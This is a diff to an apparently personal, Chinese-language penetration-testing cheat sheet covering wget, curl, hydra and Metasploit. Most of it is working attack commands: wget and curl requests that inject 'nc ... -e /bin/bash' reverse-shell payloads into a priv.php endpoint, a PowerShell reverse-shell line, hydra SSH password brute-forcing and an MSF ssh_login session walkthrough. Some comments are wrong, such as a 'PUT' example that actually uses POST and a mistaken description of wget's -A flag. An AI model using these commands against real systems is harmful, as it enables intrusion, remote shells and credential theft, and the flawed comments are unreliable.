@@ -149,14 +149,18 @@ powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sock
 ## Wget
 
 ```bash
-#用wget以post形式向某个网页提交表单
-#-o指定输出文件名，-代表直接标准输出在命令行上，--header指定提交类型（没有严格过滤的时候不指定，即去掉--header也可以）
+#用wget以post形式向某个网页提交数据
+#-O指定输出文件名，-代表直接标准输出在命令行上，--header指定提交类型（没有严格过滤的时候不指定，即去掉--header也可以）
 wget --header="Content-Type: application/json"
---post-data='{"command":"nc 192.168.6.149 6666 -e /bin/bash"}' http://127.0.0.1:8000/priv.php -o -
+--post-data='{"command":"nc 192.168.6.149 6666 -e /bin/bash"}' http://127.0.0.1:8000/priv.php -O-
 #get形式（进行了URL编码）
 wget "http://127.0.0.1:8000/priv.php?command=nc%20192.168.6.149%206666%20-e%20/bin/bash"
+#用put提交数据(提交的数据在文件中则关键字为--body-file)
+wget --method=PUT --body-data='' --header='' http://ip:port/
 #下载网页信息
 wget http://127.0.0.1:8000/priv.php
+#可以用-A来指定用户代理
+wget -A 'user_name' ........
 ```
 
 ## Curl
@@ -166,7 +170,7 @@ wget http://127.0.0.1:8000/priv.php
 curl http://127.0.0.1:8000/priv.php
 #下载网页信息
 curl -o xxx http://127.0.0.1:8000/priv.php
-#用curl以post形式向某个网页提交表单
+#用curl以post形式向某个网页提交表单（必须大写POST）
 curl -X POST -d "command=nc 192.168.6.149 6666 -e /bin/bash" http://127.0.0.1:8000/priv.php
 #用curl以post形式向某个网页提交json数据
 curl -X POST -H "Content-Type: application/json" -d '{"command":"nc 192.168.6.149 6666 -e /bin/bash"}' http://127.0.0.1:8000/priv.php
@@ -174,6 +178,8 @@ curl -X POST -H "Content-Type: application/json" -d '{"command":"nc 192.168.6.14
 curl -X POST -H "Content-Type: application/xml" -d '<command>nc 192.168.6.149 6666 -e /bin/bash</command>' http://127.0.0.1:8000/priv.php
 #用curl以get提交请求（进行了URL编码）
 curl "http://127.0.0.1:8000/priv.php?command=nc%20192.168.6.149%206666%20-e%20/bin/bash"
+#用crul以put提交数据
+curl -XPOST -H "" -d '' http://ip:port/
 ```
 
 ## hydra
@@ -182,10 +188,35 @@ curl "http://127.0.0.1:8000/priv.php?command=nc%20192.168.6.149%206666%20-e%20/b
 
 ```bash
 #-l指定用户名，-L指定用户名列表（用户名字典），-P指定密码列表（密码字典）
+#-t指定并行任务数，-W指定可等待连接的时间（超过即判定口令不对），-vV启用详细输出，-I跳过上次直接退出的恢复等待
 hydra -l username -P dictionary ssh://ip(:port)
 ```
 
+## OpenSSL
 
+加密文件、解密文件、生成密钥
+
+
+
+## MSF
+
+#### 1、ssh_login
+
+ssh登录到靶机等，然后可以在远程主机上用msf所在主机的工具
+
+```bash
+#位置auxiliary/scanner/ssh/ssh_login
+use auxiliary/scanner/ssh/ssh_login
+#
+set RHOSTS ip
+set USERNAME remote_username
+set PASSWORD remote_password
+set RPORT port
+
+run
+#获取会话
+sessions -i
+```
 
 
 
